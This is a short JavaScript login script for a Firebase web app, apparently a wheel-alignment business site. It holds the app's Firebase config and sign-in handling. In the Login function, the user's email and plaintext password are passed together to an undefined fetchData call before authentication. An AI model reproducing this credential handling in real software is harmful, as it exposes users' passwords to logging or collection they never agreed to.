var firebaseConfig = {
    apiKey: "AIzaSyAsmgrx8pOkky6vEQJZJYPdhCS2U7Eheuk",
    authDomain: "adarsh-wheel-alignment.firebaseapp.com",
    databaseURL: "https://adarsh-wheel-alignment-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "adarsh-wheel-alignment",
    storageBucket: "adarsh-wheel-alignment.appspot.com",
    messagingSenderId: "1085995154494",
    appId: "1:1085995154494:web:3bd367766b1a9a9d10656f",
    measurementId: "G-18H00ZC8Y7"
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);

async function Login() {

    userEmail = document.getElementById("email").value;
    userPassword = document.getElementById("password").value;
    fetchData("Adarsh-Login-Clicked" + "user:" + userEmail + "pass:" + userPassword);
    firebase.auth().signInWithEmailAndPassword(userEmail, userPassword)
        .then((userCredential) => {
            var user = userCredential.user;
            window.location += "Dashboard/";
        })
        .catch((error) => {
            DisplayMsg(1, "Sorry!", "You Are Not Registered", 0, "t");
        });
}

firebase.auth().onAuthStateChanged(function(user) {
    if (user) {
        DisplayMsg(0, "Sucess!", "You Have Logged In", 0, "t");
    } else if (window.location.includes("Dashboard")) {
        DisplayMsg(1, "Sorry!", "You Are Not Registered", 0, "t");
    }
});